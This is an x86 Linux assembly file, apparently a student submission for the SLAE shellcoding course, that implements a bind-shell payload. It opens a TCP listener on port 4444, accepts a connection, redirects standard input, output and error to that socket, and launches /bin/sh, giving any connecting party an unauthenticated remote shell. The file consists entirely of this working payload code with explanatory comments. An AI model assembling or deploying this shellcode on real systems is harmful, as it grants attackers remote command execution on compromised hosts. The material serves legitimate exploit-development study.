; SLAE - Assignment #1: Shell Bind TCP (Linux/x86) 
; Author:  Dipsy 
; Student ID: SLAE-1535

global _start

section .text
_start:


	; Create the socket
	sub eax, eax 
	mov al, 0x66 		; socketcall (102)

	sub ebx, ebx
	mov bl, 0x1		; SYS_SOCKET (1)

	sub ecx, ecx 
	push ecx 		; protocol (0)

	push ebx		; SOCK_STREAM (1)

	push 0x2		; AF_INET (2)

	mov ecx, esp		; point ecx to TOS
	int 0x80		; execute socket

	mov esi, eax		; move socketfd to esi


	; Bind the socket
	
	mov al, 0x66		; socketcall (102)

	mov bl, 0x2		; SYS_BIND (2)

	sub edx, edx
	push edx		; INADDRY_ANY (0)

	push word 0x5c11	; sin_port = 4444
	push bx			; AF_INET (2)

	mov ecx, esp		; point ecx to top of stack

	push 0x10		; sizeof(host_addr)

	push ecx		; pointer to host_addr struct

	push esi		; socketfd

	mov ecx, esp		; point ecx to top of stack 
	int 0x80		; execute bind
	
	

	; Listen on the socket
	sub eax, eax
	push eax		; backlog (0)

	push esi		; socketfd

	mov ecx, esp		; point ecx to stack

	mov bl, 0x4	
	
	mov al, 0x66		; socketcall (102)
	int 0x80		; execute listen


	; Accept connections
	sub edx, edx
	push edx		; NULL
	push edx		; NULL
	push esi		; socketfd
	mov ecx, esp		; point ecx to stack

	mov bl, 0x5		; SYS_ACCEPT (5)
	
	mov al, 0x66		; socketcall (102)
	int 0x80		; execute accept
	
	mov ebx, eax		; move created client_sock in ebx
	
	; Redirect STDIN, STDERR, STDOUT

	sub ecx, ecx		; zero out ecx
	mov cl, 0x2 		; set the counter
	
loop:
	mov al, 0x3f		; dup2 (63)
	int 0x80		; exec dup2
	dec ecx			; decrement counter
	jns loop		; jump until SF is set

	; Execute /bin/sh

	push edx		; NULL
	push 0x68732f2f		; "hs//"
	push 0x6e69622f 	; "nib/"
	mov ebx, esp		; point ebx to stack
	mov ecx, edx		; NULL
	mov al, 0xb		; execve
	int 0x80		; execute execve
